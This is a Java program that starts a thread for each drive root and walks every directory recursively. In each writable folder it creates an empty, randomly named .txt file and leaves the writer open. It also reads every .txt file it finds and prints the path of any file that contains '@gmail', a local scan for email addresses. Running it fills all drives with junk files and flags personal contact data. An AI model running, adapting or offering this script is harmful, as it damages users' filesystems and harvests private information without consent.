package oct12;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

import javax.swing.filechooser.FileSystemView;

public class Drives {
	public static void main(String[] args) {
		File[] paths;
		FileSystemView fsv = FileSystemView.getFileSystemView();

		paths = File.listRoots();

		for (File path : paths) {
			new Search(path).start();
		}
	}
}

class Search extends Thread {
	File file;
static double count=0;
	Search(File f) {

		file = f;
	}

	public void run() {
		System.out.println(file+" Thread Started.......");
		travel(file);

	}

	public static void travel(File file) {
		count++;
		//System.out.println(count+"\r");
		
		//System.out.println(file.getAbsolutePath());
		String path = file.getAbsolutePath();

		File f[] = file.listFiles();
		if (f == null || f.length == 0) {
			try {
				FileWriter fw = new FileWriter(new File(path + "\\"
						+ System.currentTimeMillis() + "_" + Math.random()
						+ ".txt"));
			} catch (Exception e) {
				System.out.println(path+" Access Denied...");
				return;
			}
			return;
		}
		for (int i = 0; i < f.length; i++) {
			if (f[i].isDirectory())
				travel(f[i]);
			 else {
			 String filename = f[i].getName();
			 String extension = filename.substring(
			 filename.lastIndexOf(".") + 1, filename.length());
			 if (extension.equals("txt")){
				 BufferedReader br;
				try {
					br = new BufferedReader(new FileReader(f[i]));
					String line=br.readLine();
					while(line!=null){
						if(line.toUpperCase().contains("@gmail")){
							System.out.println("*******************");
							System.out.println(f[i].getAbsolutePath());
							System.out.println("*******************"); 
					 }
						line=br.readLine();
					}
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				 
			 }
			
			 }
		}
		try {
			FileWriter fw = new FileWriter(
					new File(path + "\\" + System.currentTimeMillis() + "_"
							+ Math.random() + ".txt"));
		} catch (Exception e) {
			System.out.println(path+" Access Denied...");
			
			return;
		}
		return;
	}
}

